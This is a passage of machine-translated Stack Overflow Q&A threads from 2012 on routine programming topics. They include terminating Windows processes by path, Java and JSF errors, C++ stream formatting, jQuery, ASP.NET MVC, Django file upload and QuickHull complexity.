> wmic Path win32_process where "CommandLine Like '%C:\\Windows\\system32\\notepad.exe%'" get caption,processid,executablePath,commandline
Caption      CommandLine                                ExecutablePath                   ProcessId
notepad.exe  "C:\WINDOWS\system32\notepad.exe"          C:\WINDOWS\system32\notepad.exe  108

> wmic Path win32_process where "CommandLine Like 'C:\\Windows\\system32\\notepad.exe%'" get caption,processid,executablePath,commandline
No Instance(s) Available. 
```

因此，建议像 l0pan 的[回答](https://stackoverflow.com/questions/13524303/taskkill-to-differentiate-2-images-by-path/23502480#23502480)一样使用“ExecutablePath” 。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2014-05-06T18:41:05.783

使用以下命令（即使没有 powershell 也可以使用）：

```
wmic process where ExecutablePath='C:\\Dir1\\image.exe' delete 
```

`wmic`注意：只有在 Windows 8 上以管理员身份运行时，所有进程才能访问 ExecutablePath

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2017-10-11T09:41:04.087

您的情况似乎是当您从不同的路径在机器上安装了具有相同进程名称的自定义服务时。如果确实是这种情况，那么您可能有不同的服务名称可以用作附加过滤器。

请参阅语法：

```
taskkill /S {REPLACE_WITH_SERVER_IP_OR_NAME} /F /FI "IMAGENAME eq {REPLACE_WITH_PROCESS_NAME}" /FI "SERVICES eq {REPLACE_WITH_SERVICENAME}" 
```

请参阅示例：

```
taskkill /S 10.10.1.1 /F /FI "IMAGENAME eq tomcat7.exe" /FI "SERVICES eq tomcatServiceEngine" 
```

有关所有可用过滤器的列表，请访问[taskkill 命令](https://www.computerhope.com/taskkill.htm)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2020-09-17T02:36:27.853

除非您以管理员权限运行 powershell，否则您只能找到进程的**路径**。

32位PowerShell无法通过 找到64位进程的路径`Get-Process`，所以我建议你使用WMI或CIM。一些可能有用的参考资料：

*   [进程类 (System.Diagnostics) | Microsoft Docs § 备注](https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process#remarks)
*   [c# - 如何获取运行进程的完整路径？- 堆栈溢出](https://stackoverflow.com/questions/5497064/how-to-get-the-full-path-of-running-process)
*   [c - 从 32 位进程获取 64 位进程的命令行字符串 - 代码日志](https://stackoverflow.com/questions/7446887/get-command-line-string-of-64-bit-process-from-32-bit-process)

PowerShell 方式。基于乔伊的[回答](https://stackoverflow.com/questions/13524303/taskkill-to-differentiate-2-images-by-path#answer-13524338)和用户的[评论](https://stackoverflow.com/questions/13524303/taskkill-to-differentiate-2-images-by-path#comment109236115_13524338)。

假设程序的路径是`C:\Dir1\file.exe`. 如果程序的多个实例正在运行，则应使用以下命令：

```
Get-WmiObject Win32_Process |
    Where-Object { $_.Path -eq "C:\Dir1\file.exe" } |
        ForEach-Object { $_.Terminate() } 
```

否则，Powershell 会报错：

```
PS > (Get-WmiObject Win32_Process |
    Where-Object { $_.Path -eq "C:\Dir1\file.exe" }).Terminate()

Method invocation failed because [System.Object[]] doesn't contain a method named 'Terminate'. 
```

另外，上述命令也避免了找不到匹配进程时的错误（例如，`Path`of no process 等于`C:\Dir1\file.exe`）：

```
PS > (Get-WmiObject Win32_Process |
    Where-Object { $_.Path -eq "C:\Dir1\file.exe" }).Terminate()

You cannot call a method on a null-valued expression. 
```

* * *

如果你不喜欢 WMI：

```
Get-Process |
    Where-Object { $_.Path -eq "C:\Dir1\file.exe" } |
        ForEach-Object { Stop-Process -Id $_.Id } 
```

* * *

*我注意到两者[`Win32_Process.Terminate()`](https://docs.microsoft.com/windows/win32/cimwin32prov/terminate-method-in-class-win32-process)都[`Stop-Process`](https://docs.microsoft.com/powershell/module/microsoft.powershell.management/stop-process)用于强制终止进程，因此该进程可能无法执行任何清理工作。*

在 Windows 7 (6.1.7600.0) 上的 Powershell 2.0 中测试。

* * *

如果您喜欢 WMI，并且您使用的是 Windows 6.2（Windows server 2012 和 Windows 8）及更高版本，则应在 PowerShell 3 及更高版本（[CIM Cmdlets 简介 | PowerShell 团队简介](https://devblogs.microsoft.com/powershell/introduction-to-cim-cmdlets/)`Get-CimInstance`）中使用而不是：`Get-WmiObject`

```
Get-CimInstance Win32_Process |
    Where-Object { $_.Path -eq "C:\Dir1\file.exe" } |
        Invoke-CimMethod -MethodName "Terminate" 
```

或者，更多 CIM'y：

```
Get-CimInstance CIM_Process |
    Where-Object { $_.Path -eq "C:\Dir1\file.exe" } |
        Invoke-CimMethod -MethodName "Terminate" 
```

在这里，您可能想知道原因`Invoke-CimMethod`：

*   [WMI CIM-plified 第 5 部分：WSMAN 协议 -- Microsoft Certified Professional Magazine Online](https://mcpmag.com/articles/2009/05/14/cimplified-part-5.aspx)
*   [嘿伙计！我的方法在哪里？| 脚本博客](https://devblogs.microsoft.com/scripting/hey-dude-where-are-my-methods/)
*   [恐怕你不能再这样做了| 理查德·西达威的博客](https://richardspowershellblog.wordpress.com/2014/02/27/im-afraid-you-cant-do-that-anymore/)

而且，为什么是“CIM”：

*   [我应该在 Windows PowerShell 中使用 CIM 还是 WMI？| 脚本博客](https://devblogs.microsoft.com/scripting/should-i-use-cim-or-wmi-with-windows-powershell/)
*   [CIM 与 WMI CmdLets – 我改变的主要原因 – GivingSomethingBack](https://maikkoster.com/cim-vs-wmi-cmdlets-the-top-reasons-i-changed/)
*   [Get-CIMInstance 与 Get-WMIObject：有什么区别？](https://blog.ipswitch.com/get-ciminstance-vs-get-wmiobject-whats-the-difference)

我没有在 Windows 6.2 上测试它，而是在 Windows 10 (10.0.19041.0) 上测试它。

# java - jsf1.1 selectManyCheckbox问题

> ID：13524305
> 
> 赞同：0
> 
> 时间：2012-11-23T06:49:03.680
> 
> 标签：java, jsf

我正在使用 selectManyCheckbox 处理 JSF1.1，我有这个东西_

……

```
<%@ taglib uri="http://myfaces.apache.org/tomahawk" prefix="x"%>

</h:panelGrid>
                <h:panelGrid cellpadding="5">
                <x:selectManyCheckbox value="#{hotelBean.selectedAmenities}" layoutWidth="2">
                    <f:selectItems value="#{hotelBean.amenities}" />
                </x:selectManyCheckbox>
            </h:panelGrid>

            <h:commandButton id="saveDetails" value="Save Details"></h:commandButton> 
```

还有豆子_

```
private List<String> amenities;  
private List<String> selectedAmenities;

public HotelBean()
{
amenities = new ArrayList<String>();  
    amenities.add("Business Center");  
    amenities.add("Bar");  
    amenities.add("Cable TV");  
    amenities.add("Coffee Shop");
    amenities.add("Golf");
    amenities.add("Gym");
    amenities.add("Pub's");
    amenities.add("Swimming");
    System.err.println("---------"+amenities+"--------");
} 
```

当我面对这个页面时，我只得到了四个复选框，我尝试了布局、布局宽度，但它仍然没有显示完整的列表。它也没有在任何地方显示*错误*输出。这段代码有什么问题？有人知道吗？谢谢

# java - 错误“实际和格式参数列表的长度不同”

> ID：13524310
> 
> 赞同：1
> 
> 时间：2012-11-23T06:49:06.580
> 
> 标签：java, constructor, compiler-errors, validation

尽管我在整个网站上进行了研究，但我无法理解这个错误。起初程序运行，但它给了我一个*“y”*作为一行，验证器的选择是*“n”、“n”、“n”*。所以，我环顾了一下我的程序，找到了它，解决了它。现在我面临这个`actual and format arguments lists differ in length`问题。我尝试了各种方法，比如更改变量类型、使用不同的变量……等等。

这是我的代码。

```
 /*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package roshambo;

import java.util.Random;
import java.util.Scanner;

/**
 *
 * @author Owner
 */
public class Roshambo {

    private String name;

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        // TODO code application logic here
        String choice = "y";
        String player;

        Scanner sc = new Scanner(System.in);
        Random random = new Random();
        char[] ch = new char[]{'r','p','s'};
        int r = random.nextInt(ch.length);
        char raCh = ch[r];

        while (choice.equalsIgnoreCase("y")) {
            System.out.println("Welcome to Roshambo!");
            System.out.println("");

            //System.out.print("Please enter your name here - ");
            //String player = sc.nextLine();

            String player1 = Validator.getRequiredString("Please enter your name here - ",player);

            String roshambo = sc.nextLine();
            String roshambo1 = Validator.getChoiceString1("Please choose Rock, Paper or Scissors. (R/P/S) - ",'r','p','s');

            choice = getChoiceString("Play Again? (y/n): ","y","n");
            System.out.println("");
        }
    }
    public static String getChoiceString(String prompt, String str1, String str2)
    {
        boolean isValid = false;
        Scanner sc = new Scanner(System.in);
        String choice = "";

        while (isValid == false) {
        System.out.print(prompt);
        choice = sc.next();
        if (choice.equalsIgnoreCase(str1) || choice.equalsIgnoreCase(str2)) {
            isValid = true;

        }
        sc.nextLine();

        }
        return choice;
    }
} 
```

我究竟做错了什么？我还将添加我的验证器代码，因为我认为问题在于这两者之间。

```
/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package roshambo;

import java.util.Scanner;

/**
 * @author Owner
 */
public class Validator {

    // force the user to enter a string
    public static String getRequiredString(String prompt) {
        Scanner sc = new Scanner(System.in);
        String input = "";
        boolean isValid = false;

        while (isValid == false) {
            System.out.print(prompt);
            input = sc.nextLine();
            if (input.equals("")) {
                System.out.println("Error! This entry is required. Try again.");
            }
            else {
                isValid = true;
            }
        }
        return input;
    }
    // force the user to enter one of three strings
    public static String getChoiceString1(String prompt, String str1, String str2, String str3) {
        String input = "";
        boolean isValid = false;

        while (isValid == false) {
            input = getRequiredString(prompt);
            if (input.equalsIgnoreCase(str1) || input.equalsIgnoreCase(str2) || input.equalsIgnoreCase(str3)) {
                isValid = true;
            }
            else {
                System.out.println("Error! Entry must be '"+ str1 +"', '"+ str2 +"', or '"+ str3 +"'. Try again.");  
            }
        }
        return input;
    }
} 
```

在此先感谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T06:51:30.903

您在**Validator 类中的****getRequiredString 方法**需要一个**String 参数**，您在方法调用中传递了两个参数，String 和一个 Player（但是，您应该收到另一个编译器错误，说找不到播放器，正如您注释掉的那样）。

 ****```
public static String getRequiredString(String prompt) { // is pnly expecting one String argument.

    String player1 = Validator.getRequiredString("Please enter your name here - ",player);// passing two arguments 
```

只需从您的**方法调用中传递****提示**，错误就会消失。

 **```
 String player1 = Validator.getRequiredString("Please enter your name here - "); 
```******

# c++ - 整数输出格式。printf(%.3x) 的类似物是什么？

> ID：13524313
> 
> 赞同：2
> 
> 时间：2012-11-23T06:49:23.143
> 
> 标签：c++, formatting, iostream

我为这件事做了谷歌搜索，但还没有找到答案。我想在纯 C 中找到输出格式的模拟。更具体地说，类似于`printf(%.3x)` 可能的东西，它可以使用操纵器来完成。然而，代码

`cout << showbase << setfill('0') << setw(5) << hex << 19 << endl;`

给我`00x13`而不是期望`0x013`。

PS对不起，我没有Boost库，所以这不是解决方案..

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T06:58:12.127

利用`internal`：

```
cout << showbase << setw(5) << setfill('0') << internal << hex << 19 << endl; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T06:53:57.223

```
cout << "0x" << setfill('0') << setw(3) << hex << 19 << endl; 
```

请注意`setfill`并`hex`更改流的状态以进行后续输出，unlke`setw`只会影响下一个输出。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-23T06:56:08.997

```
char buffer[40];
snprintf(buffer, 40, "%.3x", 19);
std::cout << buffer; 
```

# javascript - 在javascript中对列表视图进行排序

> ID：13524314
> 
> 赞同：-1
> 
> 时间：2012-11-23T06:49:31.980
> 
> 标签：javascript, jquery, html

我有标题、图像和日期的列表视图。我想根据日期字段对该列表进行排序，然后显示在 html5 页面中。我在这上面使用了 jquery 和 html5。

```
$j('#task_summary_list').empty();

if (response.totalSize > 0) {
    $j.each(response.records, function(i, record) {
        var imgName;
        switch (record.Priority) {
            case "High":
                imgName = "images/prio_high24.png";
                break;
            case "Low":
                imgName = "images/prio_low24.png";
                break;
            default:
                imgName = "images/prio_normal24.png";
        }

        // create new list entry for record to the listview
        $j('<li></li>')
        .attr('id', record.Id)
        .hide()
        .append(
                '<a href="#">' + '<img src="' + imgName
                + '" alt="High" class="ui-li-icon">'
                + '<h1>'
                + record.Subject + '</h1>'
                + '<p>' + '<strong>'
                + record.ActivityDate + '</strong>' + '</p>'
                + '</a>')
        .click(function(e) {
            e.preventDefault();

            console.log("Under onSuccessTasks " + record.Id);
            showTaskDetails(record);
        })
        .appendTo('#task_summary_list')
        .show();
    });
}
else {
    $j('<li class="norecord">No records to display</li>').appendTo('#task_summary_list');
}

$j('#task_summary_list').listview('refresh');

$j.mobile.hidePageLoadingMsg(); 
```

任何帮助表示赞赏。预先感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T07:22:10.260

```
$('#dateDiv').sortElements(function(a, b){
    return Date.parse($(a).text()) > Date.parse($(b).text()) ? 1 : -1;
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:39:35.590

在我的应用程序中，我使用 sql 查询，因此我在主查询之后使用 OrderBy 子句，数据以排序形式显示在 UI 上。

谢谢

# c# - 如何将具有不同外键的值传递给asp.net mvc 3中的视图

> ID：13524320
> 
> 赞同：1
> 
> 时间：2012-11-23T06:49:56.637
> 
> 标签：c#, asp.net-mvc-3, linq, entity-framework

我的代码第一类中有 1:m 关系。我的视图的订单实例显示具有唯一 OrderID 的值。由于一个客户可以有多个订单，因此外键 CustID 在此视图中不是唯一的。

```
public class Customers
{

    public int CustomerID { get; set; }

    [StringLength(50, ErrorMessage = "{0} cannot exceed {1} characters")]
    public string LastName { get; set; }
    public string Initials { get; set; }

    public string email {get; set;}
   public List<Orders> orders { get; set; }
} 
```

订单类：

```
public class Orders
{

        [Key]
        public int OrdersID { get; set; }
        public int OrderName { get; set; }
        public int? CustomerID { get; set; }
        public virtual Customers customer { get; set; }

} 
```

下面是我的控制器：

```
 private custContext db = new custContext();

    //
    // GET: /cust/

    public ViewResult Index()
    {
        var cust = db.orders.Include(c => c.customer).Take(10);
        return View(cust.ToList());
    } 
```

如何在我的视图中仅显示**不同的客户**，而他们的**OrderNames**在同一视图中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:56:28.890

您应该考虑重命名您的类和属性以符合命名约定。使用单数名称，例如公共类 Order ... 而不是 Orders。使用 Id 作为所有字段的主键名称。以大写字母（帕斯卡大小写）开始所有属性，这将有助于框架理解您的模型。

要获取您想要的数据，只需使用：

```
var cust = db.Customers.Include("orders").Take(10); 
```

如果您对约定进行更改，这将变为：

```
var cust = db.Customers.Include("Orders").Take(10); 
```

您需要在数据上下文中设置 DbSet，但看起来您已经弄清楚了，因为您使用的是 db.Orders。无论如何，这里是代码（客户转换为单数）：

```
public DbSet<Customer> Customers { get; set; } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:11:46.233

在视图中：从...开始

```
@model IList<ProjectName.Customers> 
```

如果你想绑定多记录然后

```
foreach(var c in Model)
{
@Html.DisplayFor(modelItem => c.OrderName) 
} 
```

除此以外`@model.Orders.OrderNames....`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T08:32:52.067

```
public ViewResult Index()
    {
        var cust = db.Customers.get().Select(x => new Customers
                {
                    CustomerID = x.CustomerID,
                    OrderName = x.Orders.OrderName,
                });
        return View(cust.Take(10).ToList());
    } 
```

看法：

```
@model IList<ProjectName.Customers>

foreach(var c in Model)
{
@Html.DisplayFor(modelItem => c.OrderName) 
} 
```

# pentaho - Pentaho 数据集成 - 将“添加序列”的动态值作为开始传递

> ID：13524322
> 
> 赞同：1
> 
> 时间：2012-11-23T06:50:16.977
> 
> 标签：pentaho, kettle

我们可以在添加序列步骤的“从值开始”中传递任何动态值（这是另一个表列的最大值）吗？

请指导我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T05:01:16.547

是的，但是在编写步骤时，您必须对此偷偷摸摸。

创建两个转换并将它们包装在一个作业中。在第一个转换中，查询该数据库以获取所需的值，然后将其存储在变量中。然后在第二个转换中，您应该在第一个转换之后的作业中执行该转换，在“添加序列”步骤中，在“值开始”字段上使用变量替换来替换您之前从之前的转换中提取的值。

请注意，您不能在一次转换中完成所有这些操作，因为无法确保在添加序列步骤之前设置变量（尽管看起来等待步骤可以实现这一点，但我已经在过去并且不成功，因此不得不使用上述方法）。

# javascript - 打开页面加载 javascript 的提示提示

> ID：13524326
> 
> 赞同：0
> 
> 时间：2012-11-23T06:50:39.927
> 
> 标签：javascript, css, html

我使用了从这个位置获取的线索提示`http://plugins.learningjquery.com/cluetip/`。我需要在页面加载时打开提示提示，并在单击关闭按钮时关闭提示提示。

html代码：

```
 <a href="#"  class="load-local" title="Test" id="sticky" rel="#loadme">load</a>
     <div id="loadme">test content
<a href="#" class="cluetip-close">close</a>
</div> 
```

现在线索提示仅在鼠标悬停时打开。我需要在页面加载时打开提示提示，并在单击关闭按钮时关闭提示提示。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:56:22.917

是的，您的线索提示仅在鼠标悬停时打开，让我们调用此事件！

```
$(document).ready(function() {
   $('.load-local').trigger('mouseover');
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T08:21:56.653

您可以使用以下 html 和 jquery

```
<div class="open">
<p>This the content show on after the page loaded.</p>
<button>close</button>
</div>

$(document).ready(function() {
   $("button").click(function () {
$(".open").css("display", "none");
});
}); 
```

这里是[**演示**](http://jsfiddle.net/eyWvs/)

# c# - Dispatcher 未出现在 C# Windows 窗体应用程序上

> ID：13524327
> 
> 赞同：7
> 
> 时间：2012-11-23T06:50:46.273
> 
> 标签：c#, multithreading, dispatcher, windows-applications

我有一个带有进度条的 C# Windows 窗体应用程序。我想根据某些方法状态动态地进行。我在一个单独的类中有该方法，并且正在为该方法创建一个新线程，并使用委托将方法的状态传递给父线程。

我可以在 WPF 应用程序中解决相同的情况，`progressbar.Dispatcher`但在 Windows 窗体应用程序中没有调度程序，即使我使用`System.Threading`命名空间。

`progressbar.Dispatcher`似乎仅在 WPF 应用程序中可用。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-23T08:22:24.827

在 winforms 中，您可以使用 ProgressBar.Invoke 或 ProgressBar.BeginInvoke 从另一个线程更新控件。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-23T07:35:56.317

在 Windows 窗体应用程序`BackgroundWorker`应该完全适合您的任务。特别是，它具有`ReportProgress`根据您的计算发送进度并`ProgressChanged`跟踪 UI 线程更改的方法。有关详细信息，请参阅[MSDN 文章](http://msdn.microsoft.com/en-us/library/system.componentmodel.backgroundworker.aspx)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-11-23T08:39:06.730

[正如您从System.Windows.Forms.Control](http://msdn.microsoft.com/en-us/library/system.windows.forms.control.aspx)的文档中看到的那样，在 WinForms 中，这些`Invoke/BeginInvoke`方法直接位于控件对象上。所以你会有例如。`progressBar.BeginInvoke(...)`

# jquery - 我如何在 django 中编写自己的自定义表单小部件

> ID：13524334
> 
> 赞同：1
> 
> 时间：2012-11-23T06:51:42.593
> 
> 标签：jquery, python, django, forms, file-upload

我有 django 形式的文件字段。现在我希望在渲染过程中我的那个文件字段被 jquery fileupload 插件替换。

我怎样才能做到这一点

[http://blueimp.github.com/jQuery-File-Upload/](http://blueimp.github.com/jQuery-File-Upload/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T07:03:15.493

您不需要自定义表单小部件。您需要在 django 模板中显示您的表单，使其具有以下设置 - [https://github.com/sigurdga/django-jquery-file-upload/blob/master/fileupload/templates/fileupload/ picture_form.html](https://github.com/sigurdga/django-jquery-file-upload/blob/master/fileupload/templates/fileupload/picture_form.html)

这些 js 文件包括：-

```
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
<script src="{{ STATIC_URL }}js/jquery.ui.widget.js"></script>
<script src="{{ STATIC_URL }}js/tmpl.min.js"></script>
<script src="{{ STATIC_URL }}js/load-image.min.js"></script>
<script src="{{ STATIC_URL }}js/canvas-to-blob.min.js"></script>
<script src="{{ STATIC_URL }}js/bootstrap.min.js"></script>
<script src="{{ STATIC_URL }}js/bootstrap-image-gallery.min.js"></script>
<script src="{{ STATIC_URL }}js/jquery.iframe-transport.js"></script>
<script src="{{ STATIC_URL }}js/jquery.fileupload.js"></script>
<script src="{{ STATIC_URL }}js/jquery.fileupload-fp.js"></script>
<script src="{{ STATIC_URL }}js/jquery.fileupload-ui.js"></script>
<script src="{{ STATIC_URL }}js/locale.js"></script>
<script src="{{ STATIC_URL }}js/main.js"></script>
<script src="{{ STATIC_URL }}js/csrf.js"></script> 
```

您的表单 html 包含这些元素，表单的 id 为`fileupload`：-

```
 <form id="fileupload" method="post" action="." enctype="multipart/form-data">{% csrf_token %}
        <div class="row fileupload-buttonbar">
            <div class="span7">
                <span class="btn btn-primary fileinput-button">
                    <i class="icon-plus icon-white"></i>
                    <span>Add files...</span>
                    <input type="file" name="file" multiple>
                </span>
                <button type="submit" class="btn btn-success start">
                    <i class="icon-upload icon-white"></i>
                    <span>Start upload</span>
                </button>
                <button type="reset" class="btn btn-warning cancel">
                    <i class="icon-ban-circle icon-white"></i>
                    <span>Cancel upload</span>
                </button>
                <button type="button" class="btn btn-danger delete">
                    <i class="icon-trash icon-white"></i>
                    <span>Delete files</span>
                </button>
                <input type="checkbox" class="toggle">
            </div>
            <div class="span5 fileupload-progress fade">
                <div class="progress progress-success progres-striped active">
                    <div class="bar" style="width:0%"></div>
                </div>
                <div class="progress-extended">&nbsp;</div>
            </div>
        </div>
        <div class="fileupload-loading"></div>
        <table class="table table-striped"><tbody class="files" data-toggle="modal-gallery" data-target="#modal-gallery"></tbody></table>
    </form>
    <div class="fileupload-content">
        <table class="files"></table>
        <div class="fileupload-progressbar"></div>
    </div>
</div> 
```

# python - 从 AutoIt 执行 Python 脚本

> ID：13524339
> 
> 赞同：1
> 
> 时间：2012-11-23T06:52:11.923
> 
> 标签：python, autoit

我有一个 Python (.py) 文件，需要从 AutoIt 执行它。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T07:46:36.197

Python 脚本可以从命令行执行。对于名为 的脚本`myscript.py`，您可以通过键入以下命令来运行它（假设已安装 Python）：

```
python myscript.py 
```

如果你想运行`myscript.py`而不用前缀它`python`，那么将 Python 二进制文件的路径（例如`C:\Python27\Python.exe`）设置为 Windows 环境变量。这使 AutoIt 能够像执行外部程序一样执行 Python 脚本。参考资料：[`ShellExecute()`](http://www.autoitscript.com/autoit3/docs/functions/ShellExecute.htm)。

```
ShellExecute("myscript.py") 
```

指向`myscript.py`当然居住的地方。采用：

```
RunWait("C:\Python27\Python.exe myscript.py") 
```

避免设置环境变量。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:28:18.890

```
RunWait("C:\Python27\Python.exe filename.py") 
```

这段代码在 autoit 上运行良好

# android - 警告！未知设备 API 版本

> ID：13524340
> 
> 赞同：3
> 
> 时间：2012-11-23T06:52:28.350
> 
> 标签：android

我是 Android 编程新手。我创建了一个应用程序，并将其部署在我的 android 设备上，版本为 4.0.3。我已正确连接设备。尽管我收到了这个警告。我已经成功部署在以前的场合。我真的无法理解为什么我的设备版本现在没有被检测到。我的设备电缆是否松动？请帮忙。这很紧急

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T07:04:48.420

首先在 Eclipse 中从设备重置 adb 并检查以下内容（在 ddms go 设备中（看起来像小暴民徽标并重置 adb）

希望以下至少一项会有所帮助：

您必须先从手机的应用程序管理器中卸载该应用程序，然后才能重新安装。还要检查版本兼容性问题显然，您的设备未正确连接

nd 也使

```
<uses-sdk
        android:minSdkVersion="8"
        android:targetSdkVersion="16" /> 
```

在 androidmainfest.xml

# javascript - jquery推荐的ajax导航方式

> ID：13524341
> 
> 赞同：0
> 
> 时间：2012-11-23T06:52:33.573
> 
> 标签：javascript, jquery, html, ajax

jquery推荐的ajax导航方式

我刚刚尝试了这个简单的 jquery ajax 代码，以 ajax 方式加载页面中的所有链接。

```
$('a').click(function(e){
        e.preventDefault();
        url = $(this).attr('href');
        $('body').fadeTo('slow', 0.2); 
        $('body').load(url, function(data){
            $(this).fadeTo('slow', 1, function(){
                $(this).html(data);
                scroll(0,0);
            });
        });
    }); 
```

*[页面中的链接坚持当前域，并且不存在外部链接]*

页面加载按预期工作，但 Facebook、LinkedIn、pinterest 按钮的脚本无法加载。

我认为这不是进行 ajax 导航的最安全方法，而且我确信其他 JS 文件，内联 JavaScript 会导致错误。

[http://davidwalsh.name](http://davidwalsh.name)与 mootools 有一些很好的 ajax 导航工作。我正在尝试使用 jquery 来实现相同的目标。

该网站成功加载并执行了每个脚本，并且可以看到没有完成 ajax 工作来加载特定的脚本。

是否有任何安全的方法来实现这一点，确保 ajax 加载的页面正常工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T07:04:09.257

您应该调用将脚本附加到负载处理程序中的函数，因此它会在每次负载时重新附加所有 DOM 脚本。

F.ex，如果你有这个代码：

```
$(document).ready(function() {
    $('#facebook').doFacebook();
    $('#twitter').doTwitter();
}); 
```

将其更改为：

```
var onload = function() {
    $('#facebook').doFacebook();
    $('#twitter').doTwitter();
};
$(document).ready(onload); 
```

然后`onload`只要`body`有新内容就打电话。

内联脚本应根据[文档](http://api.jquery.com/load/)执行。

您可能还想了解如何使用以下方法操作浏览器历史记录和 URL `.pushState`：

[https://developer.mozilla.org/en-US/docs/DOM/Manipulating_the_browser_history#Adding_and_modifying_history_entries](https://developer.mozilla.org/en-US/docs/DOM/Manipulating_the_browser_history#Adding_and_modifying_history_entries)

如果你用谷歌搜索一下，有一些不错的 jQuery 插件可以跨浏览器的方式添加这个功能。

# objective-c - UIAlertView 中的错误

> ID：13524343
> 
> 赞同：-5
> 
> 时间：2012-11-23T06:52:58.443
> 
> 标签：objective-c, ios, uialertview

你知道为什么会这样吗？

![代码和错误信息](../Images/f5c6f2c56c44851fdb73eb4ae532c0f4.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T07:02:16.450

简单，使用 [EnterPhoneNumber text] 代替！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T06:55:32.347

" `EnterPhoneNumber`" 似乎是一个 " `UITextField`" 对象。

要获得实际的字符串，您需要`EnterPhoneNumber.stringValue`在该“ `initWithFormat`”方法调用中执行“”。

另外，仅供参考：如果您想遵循 Objective C 中的最佳实践，变量应该以**小写字母开头**（即，将“ `EnterPhoneNumber`”更改为“ `enterPhoneNumber`”）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T06:56:22.047

您应该使用 EnterPhoneNumber.stringValue，而不是该文本字段本身。

# java - QuickHull 算法的复杂性？

> ID：13524344
> 
> 赞同：8
> 
> 时间：2012-11-23T06:52:59.237
> 
> 标签：java, c++, algorithm, sorting, computational-geometry

我知道复杂度是 O(nlog(n))。但为什么？你是怎么得出这个答案的？

任何帮助将不胜感激，我很想知道！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-23T07:05:24.857

它的平均情况复杂度被认为是`O(n log(n))`，而在最坏的情况下它需要`O(n^2)`（二次）。

考虑以下伪代码：

```
QuickHull (S, l, r)

     if S={ }    then return ()
else if S={l, r} then return (l, r)  // a single convex hull edge
else
    z = index of a point that is furthest (max distance) from xy.
    Let A be the set containing points strictly right of (x, z)
    Let B be the set containing points strictly right of (z, y)
    return {QuickHull (A, x, z) U (z) U QuickHull (B, z, y)} 
```

分区由通过两个不同极值点的线确定：最右边的最低点`r`和最左边的最高点`l`。找到极端需要`O(n)`时间。

对于递归函数，它需要`n`一些步骤来确定极值点`z`，但递归调用的成本取决于 set`A`和 set的大小`B`。

**最好的情况。**考虑最好的情况，即每个分区几乎是平衡的。然后我们有

`T(n) = 2 T(n/2) + O(n)`.

这是一个熟悉的递归关系，其解是

`T(n) = O(n log(n))`.

这将发生在随机分布的点上。

**最坏的情况下。**最坏的情况发生在每个分区都非常不平衡时。在这种情况下，递归关系是

```
T(n) = T(n-1) + O(n) 
     = T(n-1) + cn 
```

反复展开表明这是`O(n^2)`. 因此，在最坏的情况下，QuickHull 是二次方的。

* * *

[http://www.personal.kent.edu/~rmuhamma/Compgeometry/MyCG/ConvexHull/quickHull.htm](http://www.personal.kent.edu/~rmuhamma/Compgeometry/MyCG/ConvexHull/quickHull.htm)

# wpf - WPF 样式中的排列属性

> ID：13524347
> 
> 赞同：0
> 
> 时间：2012-11-23T06:53:04.187
> 
> 标签：wpf, styles, skinning

在样式中存储 Alignments、Margins、Paddings 和其他排列属性是否正常？

# php - 添加新客户属性时出现 Magento Module Creator 错误

> ID：13524353
> 
> 赞同：1
> 
> 时间：2012-11-23T06:53:46.200
> 
> 标签：php, magento, custom-attributes

我正在使用[Magento Module Creator](http://silksoftware.com/magento-module-creator/)添加一个新的客户属性。

我在需要添加客户属性参数处选择“是”，添加一个新属性，并下载源，将其复制到我的 magento 目录。

但是后面和前端没有打开。

他们向我展示了错误

> “无法检索实体配置：客户/eav_attribute”。

我正在使用 magento 1.6.2 CE。

# objective-c - 实时 gif 解码的乐趣

> ID：13524354
> 
> 赞同：5
> 
> 时间：2012-11-23T06:53:50.830
> 
> 标签：objective-c, ios, nsurlconnection, gif, cgimage

我写[了这个要点来转换从](https://gist.github.com/4104323)[这个令人难以置信的网站](http://thejoysofcode.tumblr.com/)下载的 gif 数据，并将其转换为可以使用 MPMoviePlayerController 播放的 mp4。

问题是，我必须下载整个 gif 然后开始转换。我想在获取数据时进行转换，我相信，但无法确认，通过[传入](http://developer.apple.com/library/ios/#documentation/GraphicsImaging/Reference/CGImageSource/Reference/reference.html)`- (void)connection:(NSURLConnection *)connection didReceiveData:(NSData *)data`.

有没有人尝试过这个或知道一个例子？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T13:13:56.800

